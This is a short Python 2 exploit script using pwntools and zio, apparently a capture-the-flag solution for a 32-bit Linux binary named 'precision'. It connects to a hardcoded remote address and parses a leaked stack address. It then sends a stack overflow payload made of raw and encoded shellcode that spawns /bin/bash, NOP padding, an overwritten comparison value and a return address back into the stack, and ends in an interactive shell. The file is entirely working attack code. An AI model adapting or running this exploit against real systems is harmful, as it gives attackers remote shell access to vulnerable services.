from pwn import *
from zio import *

target = "./precision"
target = ("54.210.15.77", 1259)
context(arch = 'i386', os = 'linux')

def get_io(target):
	ELF("./precision")
	io = zio(target, timeout = 9999, print_read = COLORED(RAW, 'green'), print_write = COLORED(RAW, 'blue'))
	return io

def pwn(io):
	io.read_until("Buff: ")
	stack_addr_str = io.read_until("\n")
	stack_addr = int(stack_addr_str, 16)
	print "stack_addr:", hex(stack_addr)
	print "cmp_val_addr", hex(stack_addr + 0x80)

	cmp_value = l64(0x40501555475a31a5)

	ebp = l32(0x00)
	ret_addr = l32(stack_addr)

	shellcode = "\xb0\x46\x31\xc0\xcd\x80\xeb\x07\x5b\x31\xc0\xb0\x0b\xcd\x80\x31\xc9\xe8\xf2\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"
	shellcode = "\xeb\x16\x5e\x8a\x06\x31\xc9\x8a\x5c\x0e\x01\x80\xeb\x07\x88\x1c\x0e\x41\x38\xc8\x75\xf1\xeb\x05\xe8\xe5\xff\xff\xff\x18\x38\xc7\x57\x6f\x36\x36\x7a\x6f\x6f\x36\x69\x70\x75\x90\xea\x38\xd0\x90\xd1\x71\x12\x5f\xd4\x87";
	print disasm(shellcode)

	payload = shellcode.ljust(0x80, '\x90') + cmp_value + 'a' * 8 + ebp + ret_addr
	io.gdb_hint()
	io.write(payload + "\n")
	io.interact()


io = get_io(target)
pwn(io)